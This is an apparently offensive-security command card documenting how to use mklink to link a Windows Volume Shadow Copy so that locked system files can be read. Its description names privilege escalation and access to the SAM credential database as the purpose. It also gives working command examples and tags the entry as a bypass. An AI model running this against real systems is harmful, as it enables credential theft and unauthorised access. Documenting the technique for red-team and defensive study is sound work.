---
id: c2c2a0b4-1a3a-4ea7-858f-3af95b2a1e32
name: mklink-create-symlink-to-shadow-copy
type: command
executor: cmd
data: 'mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\'
output: null
created_at: '2023-04-06T03:56:30.010793+00:00'
updated_at: '2023-04-10T20:37:37.824369+00:00'
platforms:
  - Windows
tags:
  - symlink
  - shadow-copy
  - privilege-escalation
  - bypass
verified: true
validated: true
---

# mklink-create-symlink-to-shadow-copy

## Command

```cmd
mklink /d $_LINK_PATH $_SHADOW_COPY_PATH
```

## Description

The mklink command creates a symbolic link (directory junction) to a Volume Shadow Copy path, enabling access to locked system files from a snapshot without triggering locks on the live volume. This is key for privilege escalation by reading or modifying files like the SAM database.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /d | Creates a directory symbolic link | Yes |
| $_LINK_PATH | Local path for the symlink (e.g., c:\shadowcopy) | Yes |
| $_SHADOW_COPY_PATH | Global root path to shadow copy (e.g., \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\) | Yes |

## Examples

### Basic Usage

```cmd
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

### Advanced Usage with Different Volume

```cmd
mklink /d c:\backup \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\
```

## Expected Output

```
directory junction created for c:\shadowcopy <<===>> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

If successful, verify with `dir c:\shadowcopy` to see snapshot contents.

## Related

- [[procedures/Abusing-Shadow-Copies-for-Privilege-Escalation]]
- [[commands/vssadmin-list-shadow-copies]]
